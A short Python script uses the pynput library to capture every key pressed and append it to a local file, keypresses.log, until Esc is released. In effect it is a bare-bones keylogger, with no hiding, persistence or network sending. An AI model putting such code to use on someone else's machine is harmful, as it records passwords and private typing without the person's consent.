import pynput


def on_key_press(key):
    with open("keypresses.log", "a") as f:
        f.write("\n" + str(key))


def on_key_release(key):
    if key == pynput.keyboard.Key.esc:
        return False


with pynput.keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()
